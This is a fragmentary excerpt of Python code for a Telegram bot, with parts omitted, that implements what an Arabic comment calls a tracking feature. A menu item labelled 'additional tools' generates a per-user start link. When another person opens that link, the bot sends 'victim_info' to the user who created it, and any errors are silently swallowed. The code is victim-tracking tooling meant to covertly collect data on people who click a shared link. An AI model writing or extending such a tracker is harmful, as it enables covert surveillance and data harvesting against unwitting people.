...
def start(message):
    # ميزة التتبع: استقبال بيانات الضحية وإرسالها لصاحب الرابط
    if len(message.text.split()) > 1:
        start_param = message.text.split()[1]
        if start_param.startswith("track_"):
            admin_id = start_param.split("_")[1]
            ...
            try:
                bot.send_message(admin_id, victim_info, parse_mode="Markdown")
            except:
                pass
...
def handle_text(message):
    ...
    if text == "ادوات اضافية":
        ...
        track_url = f"https://t.me/{bot_username}?start=track_{message.from_user.id}"
